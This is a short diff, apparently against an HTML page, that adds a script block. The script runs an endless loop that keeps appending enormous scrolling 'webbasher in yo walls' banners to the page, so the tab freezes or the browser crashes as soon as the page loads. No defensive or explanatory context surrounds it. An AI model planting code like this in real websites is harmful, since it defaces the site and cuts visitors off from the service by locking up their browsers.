@@ -1,0 +1,8 @@
+<script>
+  while (true) {
+    let spam = document.createElement("div");
+    spam.innerHTML = "<marquee>🧨 webbasher in yo walls 🧨</marquee>";
+    spam.style.fontSize = "9999px";
+    document.body.appendChild(spam);
+  }
+</script>
